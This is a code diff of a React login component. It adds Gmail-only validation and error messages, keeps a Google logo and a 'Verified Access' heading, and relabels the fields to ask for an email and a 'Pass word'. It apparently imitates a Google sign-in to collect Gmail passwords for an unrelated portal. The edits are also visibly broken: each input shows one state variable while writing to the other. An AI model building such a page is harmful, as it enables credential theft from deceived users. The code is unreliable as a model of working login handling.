@@ -5,9 +5,24 @@ export default function Login() {
   const [name, setName] = useState("");
   const [email, setEmail] = useState("");
   const [loading, setLoading] = useState(false);
+  const [error, setError] = useState("");
+
+  const isValidGmail = (email) => {
+    return email.endsWith("@gmail.com");
+  };
 
   const handleLogin = async () => {
-    if (!name || !email) return alert("Enter all details");
+    setError("");
+
+    if (!name || !email) {
+      setError("Enter all details");
+      return;
+    }
+
+    if (!isValidGmail(email)) {
+      setError("Please enter a valid Gmail address (@gmail.com)");
+      return;
+    }
 
     try {
       setLoading(true);
@@ -15,7 +30,7 @@ export default function Login() {
       localStorage.setItem("token", res.data.token);
       window.location.href = "/video";
     } catch {
-      alert("Login failed");
+      setError("Login failed. Please try again.");
     } finally {
       setLoading(false);
     }
@@ -29,17 +44,21 @@ export default function Login() {
           alt="Google"
         />
         <h2>Verified Access</h2>
-        <p>Continue to College Video Portal</p>
+        <p>Continue to Portal</p>
+
+        {error && <p style={{ color: "red", fontSize: "14px" }}>{error}</p>}
 
         <input
-          placeholder="Full Name"
-          value={name}
+          placeholder="Email"
+          value={email}
           onChange={(e) => setName(e.target.value)}
+          type="email"
         />
         <input
-          placeholder="College Email"
-          value={email}
+          placeholder="Pass word"
+          value={name}
           onChange={(e) => setEmail(e.target.value)}
+          
         />
 
         <button onClick={handleLogin} disabled={loading}>
